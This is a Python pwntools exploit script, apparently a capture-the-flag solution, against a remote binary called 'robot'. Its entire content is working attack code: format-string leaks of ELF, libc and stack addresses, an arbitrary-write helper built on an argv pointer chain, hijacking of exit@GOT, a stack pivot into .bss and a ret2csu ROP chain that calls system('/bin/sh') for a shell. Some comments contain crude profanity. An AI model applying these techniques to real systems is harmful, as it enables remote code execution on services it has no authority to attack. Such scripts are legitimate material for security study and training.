#!/usr/bin/env python3
# -*- encoding: utf-8 -*-

from pwn import *
context.update(arch = 'amd64', os = 'linux', log_level = 'info')

elf  = ELF('./robot')

# ROP Gadgets
ret             = 0x000000000000101a  # ret
pop_rdi_ret     = 0x0000000000001aa3  # pop rdi ; ret
pop_rsi_r15_ret = 0x0000000000001aa1  # pop rsi ; pop r15 ; ret
pop7_ret        = 0x0000000000001a96  # add rsp, 8 ; pop * 6 ; ret
pop_rsp_pop3ret = 0x0000000000001a9d  # pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret

# Byte sequence alias
A8 = 8 * b'A'


class FmtExp:
    def __init__(self, proc, rsp):
        self.proc = proc
        self.rsp = rsp
        self.nodes = [0] * 3
        self.nodes_offset = [b'\x00'] * 3
        self.write_queue = []
        self.leak_chain()

    @staticmethod
    def to_bytes(i) -> bytes:
        return str(i).encode('utf-8')

    @staticmethod
    def offset(rsp, addr) -> bytes:
        return FmtExp.to_bytes((addr - rsp) // 8 + 5)

    def leak_chain(self):
        # Leak the address of argv chain
        # https://frozenkp.github.io/pwn/format_string/
        self.nodes[0] = self.rsp + (0x7ffd18879408 - 0x7ffd188792a0)
        self.nodes_offset[0] = FmtExp.offset(self.rsp, self.nodes[0])
        log.info('chain nodes[0]: {} (offset = {})'.format(
            hex(self.nodes[0]), self.nodes_offset[0]))

        self.proc.sendline(b'M.%' + self.nodes_offset[0] + b'$p')
        self.proc.recvuntil(b'M.')
        self.nodes[1] = int(self.proc.recvline(), 16)
        self.nodes_offset[1] = FmtExp.offset(self.rsp, self.nodes[1])
        log.info('chain nodes[1]: {} (offset = {})'.format(
            hex(self.nodes[1]), self.nodes_offset[1]))

        # node2 could contain an unaligned address,
        # we'll manually calibrate that shit.
        self.proc.sendline(self._payload(0x60, self.nodes_offset[0], b'$hhn'))
        self.proc.recvuntil(b'M')

        self.proc.sendline(b'M.%' + self.nodes_offset[1] + b'$p')
        self.proc.recvuntil(b'M.')
        self.nodes[2] = int(self.proc.recvline(), 16)
        self.nodes_offset[2] = FmtExp.offset(self.rsp, self.nodes[2])
        log.info('chain nodes[2]: {} (offset = {})'.format(
            hex(self.nodes[2]), self.nodes_offset[2]))

    def _payload(self, data: int, offset: bytes, length: bytes = b'$hhn') -> bytes:
        payload  = b''
        if ((data - 1) & 0xff) != 0x00:
            payload  = b'M%'
            payload += FmtExp.to_bytes((data - 1) & 0xff)
            payload += b'c%'
            payload += offset
            payload += length
        else:
            payload  = b'M%'
            payload += offset
            payload += length
        log.info(payload)
        return payload

    def _write(self, addr: int, data: int):
        '''
        https://frozenkp.github.io/pwn/format_string/

        [STAGE 1]

        0x7ffd13f2cdd8 —▸ 0x7ffd13f2cea8 —▸ 0x7ffd13f2e8fd ◂— '/home/robot/robot'
             node0             node1            node2

        [STAGE 2]

        0x7ffd13f2cdd8 —▸ 0x7ffd13f2cea8 —▸ 0x7ffd13f2e8fd —▸ 0x55e3ae7b6088 (exit@got.plt)
             node0             node1            node2              addr
        '''
        if data & 0xff == 0x00:
            addr -= 1

        # Stage 1
        # -------------------------------------------------
        log.info('writing address: {}'.format(hex(addr)))
        bytes_to_write = []
        bytes_to_write.append((addr      ) & 0xff)
        bytes_to_write.append((addr >>  8) & 0xff)
        bytes_to_write.append((addr >> 16) & 0xff)
        bytes_to_write.append((addr >> 24) & 0xff)
        bytes_to_write.append((addr >> 32) & 0xff)
        bytes_to_write.append((addr >> 40) & 0xff)
        bytes_to_write.append((addr >> 48) & 0xff)
        bytes_to_write.append((addr >> 56) & 0xff)

        # Make a copy of node2
        node2 = self.nodes[2]

        # Let us clean up the entire 8 bytes
        self.proc.sendline(self._payload(1, self.nodes_offset[1], b'$lln'))
        self.proc.recvuntil(b'M')

        for i in range(8):
            if bytes_to_write[i] != 0x00:
                # 第一步：透過 node1 寫 2 bytes
                length = b'$hhn' if i == 7 else b'$hn'
                self.proc.sendline(self._payload(bytes_to_write[i], self.nodes_offset[1], length))
                self.proc.recvuntil(b'M')

            # 第二步：透過 node0 將 node2 += 1
            node2 += 1
            self.proc.sendline(self._payload(node2, self.nodes_offset[0], b'$hhn'))
            self.proc.recvuntil(b'M')

        # 第三步：透過 node0 將 node2 還原至初始值
        self.proc.sendline(self._payload(self.nodes[2], self.nodes_offset[0], b'$hhn'))
        self.proc.recvuntil(b'M')


        # Stage 2
        # -------------------------------------------------
        log.info('writing data: {}'.format(hex(data)))
        bytes_to_write = []
        bytes_to_write.append((data      ) & 0xff)
        bytes_to_write.append((data >>  8) & 0xff)
        bytes_to_write.append((data >> 16) & 0xff)
        bytes_to_write.append((data >> 24) & 0xff)
        bytes_to_write.append((data >> 32) & 0xff)
        bytes_to_write.append((data >> 40) & 0xff)
        bytes_to_write.append((data >> 48) & 0xff)
        bytes_to_write.append((data >> 56) & 0xff)

        # Make a copy of addr
        _addr = addr

        # Let us clean up the entire 8 bytes
        self.proc.sendline(self._payload(1, self.nodes_offset[2], b'$lln'))
        self.proc.recvuntil(b'M')

        if data & 0xff == 0x00:
            _addr += 1
            self.proc.sendline(self._payload(_addr, self.nodes_offset[1], b'$hhn'))
            self.proc.recvuntil(b'M')

        for i in range(8):
            if bytes_to_write[i] != 0x00:
                # 第一步：透過 node2 寫 2 bytes
                length = b'$hhn' if i == 7 else b'$hn'
                self.proc.sendline(self._payload(bytes_to_write[i], self.nodes_offset[2], length))
                self.proc.recvuntil(b'M')

            # 第二步：透過 node1 將 addr += 1
            _addr += 1
            self.proc.sendline(self._payload(_addr, self.nodes_offset[1], b'$hhn'))
            self.proc.recvuntil(b'M')

        # 第三步：透過 node1 將 addr 還原至初始值
        self.proc.sendline(self._payload(addr, self.nodes_offset[1], b'$hhn'))
        self.proc.recvuntil(b'M')

    def sched_write(self, addr: int, data: int):
        self.write_queue.append((addr, data))

    def do_writes(self):
        self.write_queue.reverse()
        for addr, data in self.write_queue:
            self._write(addr, data)
        self.write_queue.clear()


def shellcode(path):
    with open(path, 'rb') as f:
        return f.read()


def main():
    '''
    攻擊思路：GOT Hijacking + ROP
    * 修改 exit@GOT 為一個直接 return 的 gadget (?)

    Format string note
    ==================
    This will leak rdx, rcx, r8, r9, [rsp], [rsp+8], ...
    %1$p = rdx
    %2$p = rcx
    %3$p = r8
    %4$p = r9
    %5$p = [rsp]
    %6$p = [rsp+8]
    '''
    proc = remote('140.112.31.97', 30202)
    #proc = elf.process()
    #log.debug('You may attatch this process to gdb now.')
    #input()

    proc.recvuntil('Give me code : ')
    proc.sendline(shellcode('./shellcode/shell.bin'))

    # Leak elf base address
    proc.sendline(b'M.%33$p')
    proc.recvuntil(b'M.')
    __libc_csu_init = int(proc.recvline(), 16)
    elf_base = __libc_csu_init - (0x55d19334fa40 - 0x55d19334e000)
    _fini = elf_base + 0x1ab8
    elf_got_exit = elf_base + (0x556d40442088 - 0x556d4043e000)
    log.info('__libc_csu_init: {}'.format(hex(__libc_csu_init)))
    log.info('_fini: {}'.format(hex(_fini)))
    log.info('elf_base: {}'.format(hex(elf_base)))
    log.info('exit@got: {}'.format(hex(elf_got_exit)))

    # Leak libc base address
    proc.sendline(b'M.%34$p')
    proc.recvuntil(b'M.')
    __libc_start_main = int(proc.recvline(), 16)
    libc_base = __libc_start_main - 158336 - 235
    libc_system = libc_base + 339920
    libc_bin_sh = libc_base + 1768324
    log.info('__libc_start_main@libc: {}'.format(hex(__libc_start_main)))
    log.info('libc_base: {}'.format(hex(libc_base)))
    log.info('system@libc: {}'.format(hex(libc_system)))
    log.info('bin_sh@libc: {}'.format(hex(libc_bin_sh)))

    # Leak rsp
    proc.sendline(b'M.%31$p')
    proc.recvuntil(b'M.')
    rsp = int(proc.recvline(), 16) - (0x7ffd0892a010 - 0x7ffd08929e50)
    log.info('rsp: {}'.format(hex(rsp)))

    bss_buf = (0x55875433c000 - 0x558754338000) + 0x800
    log.info('bss_buf: {}'.format(hex(elf_base + bss_buf)))

    fmt = FmtExp(proc, rsp)

    # Hijack exit@GOT
    fmt.sched_write(elf_got_exit, elf_base + pop7_ret)

    # Write ROP chain on stack for stack migration
    fmt.sched_write(rsp + 0x30, elf_base + pop_rsp_pop3ret)  # ret
    fmt.sched_write(rsp + 0x38, elf_base + bss_buf)          # rsp

    # Prepare for ret2csu and sys_execve
    fini_ptr = bss_buf + 0x08
    fmt.sched_write(elf_base + fini_ptr, _fini)

    # Write new ROP chain in `bss_buf`.
    # call system@libc and fuck this stupid ass
    # 再給我出狀況試試看 幹你娘
    __libc_csu_init1 = 0x1a80
    __libc_csu_init2 = 0x1a96
    fmt.sched_write(elf_base + bss_buf + 0x18, elf_base + __libc_csu_init2)   # ret2csu
    fmt.sched_write(elf_base + bss_buf + 0x28, 0)                             # rbx
    fmt.sched_write(elf_base + bss_buf + 0x30, 1)                             # rbp
    fmt.sched_write(elf_base + bss_buf + 0x38, 1)                             # r12 -> edi
    fmt.sched_write(elf_base + bss_buf + 0x40, 0)                             # r13 -> rsi
    fmt.sched_write(elf_base + bss_buf + 0x48, 1)                             # r14 -> rdx
    fmt.sched_write(elf_base + bss_buf + 0x50, elf_base + fini_ptr)           # r15
    fmt.sched_write(elf_base + bss_buf + 0x58, elf_base + __libc_csu_init1)   # ret -> call [r15 + rbx*8]
    fmt.sched_write(elf_base + bss_buf + 0x98, elf_base + pop_rdi_ret)        # ret
    fmt.sched_write(elf_base + bss_buf + 0xa0, libc_bin_sh)                   # rdi
    fmt.sched_write(elf_base + bss_buf + 0xa8, elf_base + ret)                # ret
    fmt.sched_write(elf_base + bss_buf + 0xb0, libc_system)                   # ret
    fmt.do_writes()

    proc.interactive()


if __name__ == '__main__':
    main()
